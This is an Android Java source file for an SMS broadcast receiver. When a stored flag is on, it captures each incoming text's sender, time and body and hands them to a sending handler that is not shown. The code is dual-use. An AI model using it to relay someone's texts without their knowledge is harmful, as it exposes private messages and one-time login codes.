package com.mysoft.receiver;

import android.annotation.TargetApi;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.mysoft.entity.SMS;
import com.mysoft.utils.Constant;
import com.mysoft.utils.SMSSendingHandler;

public class SMSReceiver extends BroadcastReceiver {
	@TargetApi(23)
	@Override
	public void onReceive(Context context, Intent intent) {
		SharedPreferences sp = context.getSharedPreferences(Constant.SP_FILE_NAME, Context.MODE_PRIVATE);
		Constant.started = sp.getBoolean(Constant.STARTED_KEY, false);
		if (Constant.started) {
			Bundle bundle = intent.getExtras();
			Object[] pdus = (Object[]) bundle.get("pdus");
			SmsMessage[] messages = new SmsMessage[pdus.length];
			for (int i = 0; i < pdus.length; i++) {
				byte[] pdu = (byte[]) pdus[i];
				messages[i] = SmsMessage.createFromPdu(pdu, "3gpp");
			}
			long time = 0;
			String smsContent = "";
			String address_from = "";
			for (SmsMessage message : messages) {
				time = message.getTimestampMillis();
				address_from = message.getOriginatingAddress();
				smsContent += message.getMessageBody();
			}
			SMS newSms = new SMS();
			newSms.setDate_time(time);
			newSms.setAddress(address_from);
			newSms.setContent(smsContent);
			new SMSSendingHandler(context, newSms).start();
		}
	}
}
